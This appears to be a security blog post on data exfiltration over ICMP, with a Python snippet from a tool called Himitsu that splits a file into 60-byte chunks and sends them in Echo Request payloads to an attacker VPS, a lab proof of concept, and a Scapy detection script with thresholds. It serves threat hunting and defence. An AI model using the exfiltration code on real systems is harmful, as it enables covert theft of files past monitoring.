---
title: "ICMP Exfiltration [Himitsu Tool]"
date: 2025-09-26
tags: [icmp, exfiltration, purple team, blue team, threat hunting]
---
> _Only with educational proposals_

# ICMP Protocol Overview
Transversally, network equipment that operates at layer 3 depends on the __IP protocol__ which, in turn, uses the __ping tool__. This tool is commonly used for the purpose of verifying the accessibility of a device through the network from a point of origin to its destination, such as workstations, routers or any other device with IP addressing functionalities, in addition, ping allows determining the response time and the route followed to the destination, as well as identifying at which point the connection is lost.

Ping sends __ICMP Echo (Internet Control Message Protocol) packets__ where the source device sends an Echo Request and if this is received successfully the destination device responds with Echo Reply. As a summary, an ICMP Echo packet consists of 6 fields (image 1.1) that help it work correctly.

* __Type:__ This field determines the type of ICMP message, in this case they correspond to type 8 (Request) and type 0 (Reply).
* __Code:__ This field details the type of message where an ICMP Echo packet corresponds to code 0.
* __Checksum:__ This field is responsible for verifying the sending of the packet where if the Checksum field calculated by both parties does not match, an error is signaled during transmission.
* __Indetifier & Sequence Number:__ These fields are responsible for matching the Requests with the Reply.
* __Data:__ This field contains the Payload of the ICMP packet which can be filled in randomly. This protocol does not have any content verification mechanism.

![Cabezera ICMP](/assets/images/post-icmp/cabezera.png)

The ICMP protocol does not have a content verification mechanism within the Data field, attackers can take advantage of intentionally modifying the content in order to __exfiltrate information (T1048)__ as long as they do not __exceed the maximum unit of transmission of 15** byte packets.__

![Cabezera ICMP 2](/assets/images/post-icmp/cabezera2.png)

# HIMITSU — Development & Uses
Based on what was mentioned above regarding the lack of content verification within the ICMP protocol in the Data field, different artifacts such as malware _(SombRAT & Trickbot)_ and adversary simulators _(Cobalt Strike)_ have paid attention to this point and have developed functions to establish __Command & Control channels and/or data exfiltration mechanisms through ICMP.__

In order to practically understand the execution of this technique, a tool called __Himitsu__ is developed, dependent on the Scapy library, which will be responsible for adding the function of manipulating Network packets.

```python
def enviar_paquetes(destino, partes):
    total_partes = len(partes)
    print(f"Enviando {total_partes} paquetes a {destino}")
    
    for i, parte in enumerate(tqdm(partes, desc="Enviando paquetes", ncols=100)):
        paquete = IP(dst=destino)/ICMP()/parte
        send(paquete, verbose=0)
        time.sleep(0.5) 
    print("\nTransmisión de paquetes finalizada.")
    partes = divide_archivo(nombre_archivo, 60)
```

Himitsu is responsible for dividing the files of interest __into segments of 60 Bytes__ taking into account the maximum network packet transmission unit to subsequently be sent to their destination. _It should be noted that, in turn, it contains an assembler which is responsible for restoring the sent packages to the original file once delivered to their destination._

![Diagrama 1](/assets/images/post-icmp/diagrama.png)

The previous diagram presents an illustration of the operation at the logical level of the execution of Himitsu with the previously mentioned artifacts _(segmenter and assembler)_ which execute the entire exfiltration chain.

# Proof of Concept — Himitsu
After the development of the tool, a laboratory was built that consists of a Personal Station _(Work-01)_ with a __Wazuh agent__ and access to the __Internet__, which was already compromised by the attacker and on the other hand, a VPS hosted in the Azure cloud. __(Attack-01)__ simulating the attacking station with a static public IP address to which exclusions are made at the Firewall level to __allow the reception of ICMP packets from the Internet.__ The flow presented is an example of the attack chain that will be carried out throughout this proof of concept.

![Diagrama 2](/assets/images/post-icmp/diagrama2.png)

Himitsu.py is executed targeting __20.55.3[.]79 (Attack-01)__ with the purpose of exfiltrating the information contained within the __pepe.txt file.__ Once the tool is executed, it indicates the number of packets to be sent during the exfiltration process.

![Example 1](/assets/images/post-icmp/example1.png)

Additionally, in the Attack-001 station, ensambaldor.py is executed with the instruction that the information obtained from the data field of the ICMP packets will be reconstructed to the __pepe.txt__ file.

![Example 2](/assets/images/post-icmp/example2.png)

Inside the virtual machine hosted in Azure, Wireshark is run in order to understand the traffic flow between the Work-01 station and Attack-01. Once the sample is obtained, multiple Echo Request packets can be seen originating from the IP address __181.43.203[.]43__, which corresponds to the public IP of Work-01, followed by Echo Reply packets destined for Work-01 indicating successful communication between both stations.

![PCAP 1](/assets/images/post-icmp/pcap.png)

When reviewing the details of the captured packets, you can see that the Data field has an exact weight of 60 Bytes and in turn indicates in the hexadecimal display the readable __strings “PEPEPEPEPEPEPE….”__ which corresponds to the content of __“pepe.txt”.__

![Example 3](/assets/images/post-icmp/example3.png)

After completing the execution of assembler.py in Attack-01, the __C:\Users\Test01\Documents directory__ is entered with the purpose of identifying if the file sent through the __ICMP packets__ was successfully reconstructed.

![Example 4](/assets/images/post-icmp/example4.png)

Upon identifying that pepe.txt was successfully rebuilt, its integrity is checked by reviewing its content along with the calculation of the Hash, coinciding with both Work-01 and Attack-01, indicating success in the exfiltration process.

![Example 5](/assets/images/post-icmp/example5.png)

# Use Case Modeling & Detection
As mentioned in point 3, the Work-01 station contains a Wazuh agent whose purpose is to identify Sysmon and Security events recorded on the machine during Himitsu’s execution in a more readable way. During the activity, only __security events 4688__ are recorded along with __Sysmon 1 events__, both indicating the creation of the process at the time of executing the script but without indicating the existence of any network activity during its execution.

![Detection 1](/assets/images/post-icmp/detection1.png)

Because by default the events delivered by the system do not generate detection of network activity based on ICMP fields and behavior, the following detection modeling is presented to identify possible exfiltration through the protocol.

![Diagrama 3](/assets/images/post-icmp/diagrama3.png)

Based on the model presented, a Python script is developed which will be responsible for analyzing the packets taking into account the aforementioned criteria, taking as values: A quantity greater than 10 ICMP packets sent to the same address with a Payload greater than 59 bytes in packets during a 1-minute window taking only Echo Request packets.

```python
from scapy.all import sniff, ICMP, IP
import time

MAX_PACKETS = 10 #Paremetros variable según el entorno de red.
TIME_WINDOW = 60 #Paremetros variable según el entorno de red.
MIN_PAYLOAD_SIZE = 59 #Paremetros variable según el entorno de red.
ECHO_REQUEST_TYPE = 8 #Paremetros variable según el entorno de red.

packet_counts = {}
start_time = time.time()
destinos_detectados = set()

def analizar_paquete(packet):
    global start_time, packet_counts, destinos_detectados

    if packet.haslayer(ICMP) and packet.haslayer(IP):
        if packet[ICMP].type == ECHO_REQUEST_TYPE and len(packet[ICMP].load) >= MIN_PAYLOAD_SIZE:
            destino = packet[IP].dst
            current_time = time.time()

            if current_time - start_time > TIME_WINDOW:
                packet_counts = {}
                destinos_detectados = set()
                start_time = current_time

            packet_counts[destino] = packet_counts.get(destino, 0) + 1

            if packet_counts[destino] > MAX_PACKETS and destino not in destinos_detectados:
                destinos_detectados.add(destino)
                print(f"Posible exfiltración de datos detectada hacia {destino}")

def main():
    print("Iniciando detección de exfiltración de datos ICMP...")
    sniff(filter="icmp", prn=analizar_paquete, store=False)

if __name__ == "__main__":
    main()
```

After development, tests are carried out in a controlled environment, carrying out the exfiltration to the address __8.8.8[.]8__ executing model1.py in turn, which detects a possible exfiltration of information towards the mentioned IP, being successful. model correlation.

![Example 6](/assets/images/post-icmp/example6.png)

# Conclusions
> During the course of the investigation, a lower-level analysis of the ICMP protocol and its potential misuse for data exfiltration has been carried out. Through the development and implementation of laboratories with the Himitsu tool, it has been possible to demonstrate how ICMP packets can be manipulated to transmit information covertly, thus highlighting a significant vulnerability in the protocol due to its lack of a content verification mechanism in fields such as Data.
Throughout the document it has been shown that despite the existing restrictions on the size of the protocol packets, it is feasible to segment and send information through multiple packets, thus being able to replicate techniques such as data exfiltration through the DNS protocol. This development once again highlights the need to generate new detection methods within the Threat Hunting and Incident Response processes that can be adapted transversally in scenarios where there are no tools for correlation.
During this investigation, Scapy proved to be a great ally on the cyber defense side, since although this library usually has a more offensive approach as was presented in this document, it also allows Cyber Defense teams to create their own detection models. when wanting to identify possible threats at the network level.
